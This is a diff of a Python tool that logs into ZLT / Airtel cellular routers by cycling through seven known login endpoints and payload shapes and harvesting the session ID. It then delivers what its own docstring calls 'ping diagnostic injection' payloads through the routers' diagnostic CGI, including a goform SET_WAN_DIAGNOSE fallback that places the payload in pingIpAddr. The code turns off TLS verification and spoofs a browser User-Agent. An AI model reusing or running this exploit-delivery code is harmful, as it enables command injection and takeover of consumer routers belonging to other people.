@@ -267,116 +267,151 @@ def web_login(
 
     Returns: (success, session_id, error_message)
 
-    The function tries three different login payload shapes used across
-    various ZLT / Airtel firmware revisions so it degrades gracefully.
+    The function tries multiple CGI paths and payload formats used across
+    various ZLT / Airtel firmware revisions.
     """
-    url = f"{proto}://{router_ip}/cgi-bin/http.cgi"
     ctx = ssl._create_unverified_context() if proto == "https" else None
 
     base_headers = {
-        "Content-Type":     "application/json",
+        "Content-Type":     "application/x-www-form-urlencoded",
         "X-Requested-With": "XMLHttpRequest",
         "Origin":           f"{proto}://{router_ip}",
         "Referer":          f"{proto}://{router_ip}/index.html",
         "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
     }
 
-    # Multiple payload shapes used across firmware variants
-    payloads = [
-        # Shape 1 — most common (yocto_orca v4.x)
-        {
-            "cmd":      1,
-            "method":   "POST",
-            "subcmd":   1,
-            "language": "EN",
-            "username": username,
-            "password": password,
-        },
-        # Shape 2 — older builds
-        {
-            "cmd":      100,
-            "method":   "POST",
-            "subcmd":   0,
-            "language": "EN",
-            "user":     username,
-            "pass":     password,
-        },
-        # Shape 3 — some OEM rebrands
-        {
-            "cmd":      1,
-            "method":   "POST",
-            "subcmd":   0,
-            "language": "EN",
-            "loginUsername": username,
-            "loginPassword": password,
-        },
-    ]
-
     def _extract_sid(headers, body: str) -> str:
         """Try every known location the sessionId could appear."""
-        # 1. Set-Cookie header
+        # 1. Set-Cookie header  (most firmware put it here)
         for hdr_name in ("Set-Cookie", "set-cookie"):
             cookie_val = headers.get(hdr_name, "")
-            m = re.search(r"sessionId=([A-Za-z0-9_\-]{8,})", cookie_val)
+            m = re.search(r"sessionId=([A-Za-z0-9_\-]{6,})", cookie_val)
             if m:
                 return m.group(1)
 
-        # 2. JSON body field
+        # 2. JSON body fields
         try:
             j = json.loads(body)
-            for key in ("sessionId", "session_id", "sid", "token"):
-                if isinstance(j.get(key), str) and len(j[key]) >= 8:
-                    return j[key]
+            for key in ("sessionId", "session_id", "sid", "token", "result"):
+                val = j.get(key)
+                if isinstance(val, str) and len(val) >= 6:
+                    return val
         except (json.JSONDecodeError, AttributeError):
             pass
 
-        # 3. Anywhere in raw body (last resort)
-        m = re.search(r"sessionId[\"'\s:=]+([A-Za-z0-9_\-]{8,})", body)
-        if m:
-            return m.group(1)
+        # 3. Raw body pattern — catches any key=value or "key":"value" form
+        for pattern in (
+            r'sessionId["\s:=]+([A-Za-z0-9_\-]{6,})',
+            r'sid["\s:=]+([A-Za-z0-9_\-]{6,})',
+            r'token["\s:=]+([A-Za-z0-9_\-]{6,})',
+        ):
+            m = re.search(pattern, body, re.IGNORECASE)
+            if m:
+                return m.group(1)
 
         return ""
 
-    for payload in payloads:
-        data = json.dumps(payload).encode("utf-8")
+    # ── Attempt table ────────────────────────────────────────────────────────
+    # Each entry: (url, encoded_body, content-type)
+    # We try every known CGI path + payload format used across ZLT firmware.
+
+    import urllib.parse
+
+    attempts = [
+        # ── goform path (ZLT M30, M60, X25 newer builds) ──────────────────
+        # Form-encoded POST to goform/goform_set_cmd_process
+        (
+            f"{proto}://{router_ip}/goform/goform_set_cmd_process",
+            urllib.parse.urlencode({
+                "goformId":        "LOGIN",
+                "password":        password,
+                "username":        username,
+            }).encode("utf-8"),
+            "application/x-www-form-urlencoded",
+        ),
+        # goform with plain password field (some builds skip username)
+        (
+            f"{proto}://{router_ip}/goform/goform_set_cmd_process",
+            urllib.parse.urlencode({
+                "goformId":  "LOGIN",
+                "password":  password,
+            }).encode("utf-8"),
+            "application/x-www-form-urlencoded",
+        ),
+        # ── /cgi-bin/http.cgi JSON paths (X25 original, yocto_orca) ───────
+        (
+            f"{proto}://{router_ip}/cgi-bin/http.cgi",
+            json.dumps({
+                "cmd": 1, "method": "POST", "subcmd": 1,
+                "language": "EN", "username": username, "password": password,
+            }).encode("utf-8"),
+            "application/json",
+        ),
+        (
+            f"{proto}://{router_ip}/cgi-bin/http.cgi",
+            json.dumps({
+                "cmd": 100, "method": "POST", "subcmd": 0,
+                "language": "EN", "user": username, "pass": password,
+            }).encode("utf-8"),
+            "application/json",
+        ),
+        # ── /cgi-bin/http.cgi form-encoded ────────────────────────────────
+        (
+            f"{proto}://{router_ip}/cgi-bin/http.cgi",
+            urllib.parse.urlencode({
+                "username": username, "password": password, "action": "login",
+            }).encode("utf-8"),
+            "application/x-www-form-urlencoded",
+        ),
+        # ── /login.cgi (some rebranded units) ─────────────────────────────
+        (
+            f"{proto}://{router_ip}/login.cgi",
+            urllib.parse.urlencode({
+                "username": username, "password": password,
+            }).encode("utf-8"),
+            "application/x-www-form-urlencoded",
+        ),
+        # ── /cgi-bin/login (MiFi-style) ───────────────────────────────────
+        (
+            f"{proto}://{router_ip}/cgi-bin/login",
+            urllib.parse.urlencode({
+                "username": username, "password": password,
+            }).encode("utf-8"),
+            "application/x-www-form-urlencoded",
+        ),
+    ]
+
+    last_err = "No login endpoint responded"
+
+    for url, data, ctype in attempts:
+        hdrs = {**base_headers, "Content-Type": ctype}
         try:
-            req = urllib.request.Request(
-                url, data=data, headers=base_headers, method="POST"
-            )
+            req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
             with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
-                body    = resp.read().decode("utf-8", errors="ignore")
-                sid     = _extract_sid(resp.headers, body)
+                body = resp.read().decode("utf-8", errors="ignore")
+                sid  = _extract_sid(resp.headers, body)
                 if sid:
                     return True, sid, ""
-
-                # Some firmwares redirect after login — follow cookie from redirect
-                # and retry a lightweight GET to pull a fresh sessionId
-                try:
-                    get_req = urllib.request.Request(
-                        f"{proto}://{router_ip}/cgi-bin/http.cgi",
-                        headers={**base_headers, "Cookie": ""},
-                    )
-                    with urllib.request.urlopen(get_req, timeout=timeout, context=ctx) as gr:
-                        sid = _extract_sid(gr.headers, gr.read().decode("utf-8", errors="ignore"))
-                        if sid:
-                            return True, sid, ""
-                except Exception:
-                    pass
+                # Reached the server but no sid yet — record and keep trying
+                last_err = f"Endpoint {url} responded (HTTP {resp.status}) but no sessionId in response"
 
         except urllib.error.HTTPError as e:
             err_body = e.read().decode("utf-8", errors="ignore")
             sid      = _extract_sid(e.headers, err_body)
             if sid:
                 return True, sid, ""
-            if "invalid" in err_body.lower() or "incorrect" in err_body.lower():
+            low = err_body.lower()
+            if any(k in low for k in ("invalid", "incorrect", "wrong", "denied", "fail")):
                 return False, "", "Wrong username or password"
-            # Non-auth HTTP error — try next payload shape
+            last_err = f"HTTP {e.code} from {url}"
+            continue
+        except urllib.error.URLError:
+            # This endpoint doesn't exist on this router — try next
             continue
         except Exception as exc:
-            # Network-level error — not a credential problem, skip remaining shapes
             return False, "", str(exc)
 
-    return False, "", "Login succeeded but no sessionId found in any response field"
+    return False, "", last_err
 
 
 def send_cgi_payload(
@@ -386,19 +421,50 @@ def send_cgi_payload(
     session_id: str,
     timeout: float = 6.0,
 ) -> Tuple[bool, str]:
-    url  = f"{proto}://{router_ip}/cgi-bin/http.cgi"
-    data = json.dumps(payload).encode("utf-8")
-    headers = {
-        "Content-Type":     "application/json",
-        "X-Requested-With": "XMLHttpRequest",
-        "Origin":           f"{proto}://{router_ip}",
-        "Referer":          f"{proto}://{router_ip}/index.html",
-        "Cookie":           f"sessionId={session_id}",
-        "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-    }
+    """
+    Sends a command payload (like ping diagnostic injection) to the router.
+    Tries both /cgi-bin/http.cgi and /goform paths depending on firmware.
+    """
+    import urllib.parse
+    
+    # Attempt 1: /cgi-bin/http.cgi with JSON (yocto_orca)
     try:
+        url  = f"{proto}://{router_ip}/cgi-bin/http.cgi"
+        data = json.dumps(payload).encode("utf-8")
+        headers = {
+            "Content-Type":     "application/json",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin":           f"{proto}://{router_ip}",
+            "Referer":          f"{proto}://{router_ip}/index.html",
+            "Cookie":           f"sessionId={session_id}",
+            "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        }
         ctx = ssl._create_unverified_context() if proto == "https" else None
         req = urllib.request.Request(url, data=data, headers=headers, method="POST")
+        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+            return True, resp.read().decode("utf-8", errors="ignore")
+    except Exception:
+        pass
+    
+    # Attempt 2: /goform/goform_set_cmd_process with form-encoded (newer ZLT)
+    try:
+        url = f"{proto}://{router_ip}/goform/goform_set_cmd_process"
+        # Extract meaningful fields from payload dict for goform
+        form_data = urllib.parse.urlencode({
+            "goformId":  "SET_WAN_DIAGNOSE",
+            "Type":      "ping",
+            "pingIpAddr": payload.get("ip", "127.0.0.1"),
+        }).encode("utf-8")
+        headers = {
+            "Content-Type":     "application/x-www-form-urlencoded",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin":           f"{proto}://{router_ip}",
+            "Referer":          f"{proto}://{router_ip}/index.html",
+            "Cookie":           f"sessionId={session_id}",
+            "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        }
+        ctx = ssl._create_unverified_context() if proto == "https" else None
+        req = urllib.request.Request(url, data=form_data, headers=headers, method="POST")
         with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
             return True, resp.read().decode("utf-8", errors="ignore")
     except Exception as e:
